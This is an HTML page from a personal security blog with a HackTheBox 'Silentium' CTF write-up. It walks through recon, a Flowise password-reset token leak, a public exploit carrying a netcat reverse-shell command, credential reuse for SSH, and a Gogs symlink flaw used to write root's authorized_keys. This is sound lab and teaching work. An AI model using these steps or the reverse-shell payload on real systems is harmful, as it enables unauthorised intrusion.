@@ -1,0 +1,390 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="cache-control" content="no-cache">
+  <meta http-equiv="expires" content="0">
+  
+  <title>Silentium - CTF Writeup | zerrox&#39; security blog</title>
+  <meta name="author" content="zerrox9">
+  
+  <meta name="description" content="Writeup for Silentium CTF.">
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta property="og:title" content="Silentium - CTF Writeup"/>
+  <meta property="og:site_name" content="zerrox&#39; security blog"/>
+
+  
+    <meta property="og:image" content=""/>
+  
+
+  
+    <link rel="alternative" href="/project/atom.xml" title="zerrox&#39; security blog" type="application/atom+xml">
+  
+  
+    <link href="/project/favicon.png" rel="icon">
+  
+  
+  <link rel="stylesheet" href="/project/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/project/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/project/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/project/css/responsive.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/project/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/project/css/prism.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/project/css/google-fonts.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+
+  <script src="/project/js/jquery-2.0.3.min.js"></script>
+
+  <!-- analytics -->
+  
+  <!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-70812759-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-70812759-1');
+</script>
+
+
+
+
+
+
+<meta name="generator" content="Hexo 8.1.2"></head>
+
+ <body>  
+  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+    <div class="container">
+      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+		<span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+	  <a class="navbar-brand" href="/project/">zerrox&#39; security blog</a>
+      <div class="collapse navbar-collapse nav-menu">
+		<ul class="nav navbar-nav">
+		  
+		  <li>
+			<a href="/project/archives" title="All the articles.">
+			  <i class=""></i>Archives
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/project/categories" title="All the categories.">
+			  <i class=""></i>Categories
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/project/tags" title="All the tags.">
+			  <i class=""></i>Tags
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/project/about" title="About me.">
+			  <i class=""></i>About
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/project/atom.xml" title="Subscribe me.">
+			  <i class=""></i>RSS
+			</a>
+		  </li>
+		  
+		</ul>
+      </div>
+    </div> <!-- container -->
+</nav>
+<div class="clearfix"></div>
+
+  <div class="container">
+  	<div class="content">
+    	 
+
+
+	
+		<div class="page-header">
+			<h1> Silentium - CTF Writeup</h1>
+		</div>
+	
+
+
+
+<div class="row post">
+	<!-- cols -->
+	
+	<div id="top_meta"></div>
+	<div class="col-md-9">
+	
+
+	<!-- content -->
+	<div class="mypage">		
+	  
+		 <div class="alert alert-success description">
+			<i class="fa fa-info-circle"></i> Writeup for Silentium CTF.
+		 </div> <!-- alert -->
+	  		
+
+	  <h1 id="Silentium-CTF-Writeup"><a href="#Silentium-CTF-Writeup" class="headerlink" title="Silentium - CTF Writeup"></a>Silentium - CTF Writeup</h1><h2 id="Reconnaissance"><a href="#Reconnaissance" class="headerlink" title="Reconnaissance"></a>Reconnaissance</h2><p>A full TCP scan exposed SSH and an nginx web server. The web server redirected to the virtual host <code>silentium.htb</code>.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -T4 -A -sS -sV -p- 10.129.9.0</span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th>Port</th>
+<th>Service</th>
+<th>Version</th>
+<th>Notes</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>22/tcp</code></td>
+<td>SSH</td>
+<td>OpenSSH 9.6p1 Ubuntu 3ubuntu13.15</td>
+<td>Ubuntu host</td>
+</tr>
+<tr>
+<td><code>80/tcp</code></td>
+<td>HTTP</td>
+<td>nginx 1.24.0</td>
+<td>Redirects to <code>silentium.htb</code></td>
+</tr>
+</tbody></table>
+<p>Virtual host enumeration revealed another application:</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">staging.silentium.htb</span><br></pre></td></tr></table></figure>
+
+<h2 id="Web-Enumeration"><a href="#Web-Enumeration" class="headerlink" title="Web Enumeration"></a>Web Enumeration</h2><p>The password reset flow on the staging host returned a useful backend error:</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Transaction is not started yet, start transaction before commiting or rolling it back</span><br></pre></td></tr></table></figure>
+
+<p>The main site exposed a user named <code>Ben</code>, which gave a likely email address:</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ben@silentium.htb</span><br></pre></td></tr></table></figure>
+
+<p>The staging application was running Flowise <code>3.0.5</code>. This version is affected by CVE-2025-58434, where the password reset endpoint exposes a valid <code>tempToken</code> in the response. Using the leaked token, I reset Ben’s password and authenticated to the staging application.</p>
+<h2 id="Initial-Access"><a href="#Initial-Access" class="headerlink" title="Initial Access"></a>Initial Access</h2><p>After logging in to Flowise, I used the public Flowise <code>3.0.5</code> exploit to get command execution:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">python3 exploit.py \</span><br><span class="line">  --email ben@silentium.htb \</span><br><span class="line">  --password <span class="string">&#x27;&lt;new-password&gt;&#x27;</span> \</span><br><span class="line">  --url http://staging.silentium.htb/ \</span><br><span class="line">  --cmd <span class="string">&#x27;nc &lt;tun0-ip&gt; 1337 -e sh&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>The container did not have <code>bash</code>, so the shell had to be stabilized with <code>ash</code>:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">python3 -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/ash&quot;)&#x27;</span></span><br><span class="line"><span class="comment"># Ctrl+Z</span></span><br><span class="line"><span class="built_in">stty</span> raw -<span class="built_in">echo</span>; <span class="built_in">fg</span></span><br><span class="line"><span class="built_in">export</span> TERM=xterm</span><br></pre></td></tr></table></figure>
+
+<h2 id="Container-Enumeration"><a href="#Container-Enumeration" class="headerlink" title="Container Enumeration"></a>Container Enumeration</h2><p>The full environment and database dumps were noisy. The important finding was that the container exposed SMTP credentials for the <code>ben</code> account:</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">FLOWISE_USERNAME=ben</span><br><span class="line">SMTP_HOST=mailhog</span><br><span class="line">SMTP_PORT=1025</span><br><span class="line">SMTP_PASSWORD=&lt;reused-password&gt;</span><br></pre></td></tr></table></figure>
+
+<p>The SMTP password was reused for SSH, which gave a stable shell as <code>ben</code>:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh ben@silentium.htb</span><br></pre></td></tr></table></figure>
+
+<h2 id="Internal-Services"><a href="#Internal-Services" class="headerlink" title="Internal Services"></a>Internal Services</h2><p>From the host, several services were only listening locally:</p>
+<table>
+<thead>
+<tr>
+<th>Address</th>
+<th>Service</th>
+<th>Notes</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>127.0.0.1:3000</code></td>
+<td>Flowise</td>
+<td>Internal Flowise service</td>
+</tr>
+<tr>
+<td><code>127.0.0.1:3001</code></td>
+<td>Gogs</td>
+<td>Internal Git service</td>
+</tr>
+<tr>
+<td><code>127.0.0.1:1025</code></td>
+<td>SMTP</td>
+<td>MailHog SMTP</td>
+</tr>
+<tr>
+<td><code>127.0.0.1:8025</code></td>
+<td>HTTP</td>
+<td>MailHog web UI</td>
+</tr>
+</tbody></table>
+<p>The Gogs configuration was readable from:</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/opt/gogs/gogs/custom/conf/app.ini</span><br></pre></td></tr></table></figure>
+
+<p>The relevant settings were:</p>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">RUN_USER</span> = root</span><br><span class="line"></span><br><span class="line"><span class="section">[server]</span></span><br><span class="line"><span class="attr">HTTP_ADDR</span> = <span class="number">127.0</span>.<span class="number">0.1</span></span><br><span class="line"><span class="attr">HTTP_PORT</span> = <span class="number">3001</span></span><br><span class="line"><span class="attr">DOMAIN</span> = staging-v2-code.dev.silentium.htb</span><br><span class="line"><span class="attr">ROOT_URL</span> = http://staging-v2-code.dev.silentium.htb/</span><br><span class="line"></span><br><span class="line"><span class="section">[database]</span></span><br><span class="line"><span class="attr">TYPE</span> = sqlite3</span><br><span class="line"><span class="attr">PATH</span> = /opt/gogs/data/gogs.db</span><br><span class="line"></span><br><span class="line"><span class="section">[repository]</span></span><br><span class="line"><span class="attr">ROOT_PATH</span> = /root/gogs-repositories</span><br></pre></td></tr></table></figure>
+
+<p>The key detail is that Gogs runs as <code>root</code> and stores repositories under <code>/root/gogs-repositories</code>.</p>
+<h2 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege Escalation"></a>Privilege Escalation</h2><p>After adding a public key through Gogs, SSH authentication as <code>root</code> reached the Gogs git shell instead of an interactive shell:</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Hi there, You&#x27;ve successfully authenticated, but Gogs does not provide shell access.</span><br></pre></td></tr></table></figure>
+
+<p>That confirmed the key path was being handled by Gogs, but it did not directly provide root access.</p>
+<p>The useful escalation path is the Gogs <code>PutContents</code> symlink issue tracked as CVE-2025-8110. With an authenticated Gogs user, the vulnerable API can be abused to write through a repository symlink. Because this instance runs as <code>root</code>, that write can target root-owned paths such as <code>/root/.ssh/authorized_keys</code>.</p>
+<p>Useful target details:</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Gogs URL: http://staging-v2-code.dev.silentium.htb/</span><br><span class="line">Gogs data: /opt/gogs/data/gogs.db</span><br><span class="line">Repository root: /root/gogs-repositories</span><br></pre></td></tr></table></figure>
+
+<p>References:</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://nvd.nist.gov/vuln/detail/CVE-2025-58434">CVE-2025-58434 - NVD</a></li>
+<li><a target="_blank" rel="noopener" href="https://nvd.nist.gov/vuln/detail/CVE-2025-8110">CVE-2025-8110 - NVD</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/BridgerAlderson/CVE-2025-81110-PoC">CVE-2025-81110 PoC</a></li>
+</ul>
+
+	  <div class="article-footer-copyright">
+
+    本博客采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议(CC BY-NC-SA 4.0) 发布.</a>
+</div>
+
+	</div>
+
+	
+	
+	<div>
+  	<center>
+
+	<div class="pagination">
+
+    
+    
+    <a href="/project/2026/06/27/2026-06-27-abusing-system-services/" type="button" class="btn btn-default"><i
+                class="fa fa-arrow-circle-o-left"></i> Prev</a>
+    
+
+    <a href="/project/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
+    
+    <a href="/project/2026/05/31/2026-05-31-principal/" type="button" class="btn btn-default ">Next<i
+                class="fa fa-arrow-circle-o-right"></i></a>
+    
+
+    
+</div>
+
+
+    </center>
+	</div>
+	
+	<!-- comment -->
+	<!--
+<section id="comment">
+    <h2 class="title">Comments</h2>
+
+    
+</section>
+
+-->
+	
+	
+	
+	</div> <!-- col-md-9/col-md-12 -->
+
+
+	
+	<div id="side_meta">
+		<div class="col-md-3" id="post_meta"> 
+
+	<!-- date -->
+	
+	<div class="meta-widget">
+	<i class="fa fa-clock-o"></i>
+	2026-06-04 
+	</div>
+	
+
+	<!-- categories -->
+    
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#categorys"><i class="fa fa-folder"></i></a>	
+    <ul id="categorys" class="tag_box list-unstyled collapse in">
+          
+  <li>
+    <li><a href="/project/categories/hackthebox/">hackthebox<span>6</span></a></li>
+  </li>
+
+    </ul>
+	</div>
+	
+
+	<!-- tags -->
+	
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#tags"><i class="fa fa-tags"></i></a>		  
+    <ul id="tags" class="tag_box list-unstyled collapse in">	  
+	    
+  <li><a href="/project/tags/hackthebox/">hackthebox<span>6</span></a></li>
+    </ul>
+	</div>
+		
+
+	<!-- toc -->
+	<div class="meta-widget">
+	
+	</div>
+	
+    <hr>
+	
+</div><!-- col-md-3 -->
+
+		
+
+	</div>
+	
+		
+
+</div><!-- row -->
+
+<!--
+ -->
+
+
+
+	</div>
+  </div>
+  <div class="container-narrow">
+  <footer> <p>
+  
+  &copy; 2026 zerrox9's Blog
+  
+      powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.Theme <a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" target="_blank">freemind.bithack</a>  
+</p>
+ </footer>
+</div> <!-- container-narrow -->
+  
+
+
+  
+<a id="gotop" href="#">   
+  <span>⬆︎TOP</span>
+</a>
+
+<script src="/project/js/jquery.imagesloaded.min.js"></script>
+<script src="/project/js/gallery.js"></script>
+<script src="/project/js/bootstrap.min.js"></script>
+<script src="/project/js/main.js"></script>
+<script src="/project/js/search.js"></script> 
+
+
+<link rel="stylesheet" href="/project/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/project/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+
+   <script type="text/javascript">      
+     var search_path = "search.xml";
+	 if (search_path.length == 0) {
+	 	search_path = "search.xml";
+	 }
+	 var path = "/project/" + search_path;
+     searchFunc(path, 'local-search-input', 'local-search-result');
+   </script>
+
+</body>
+   </html>
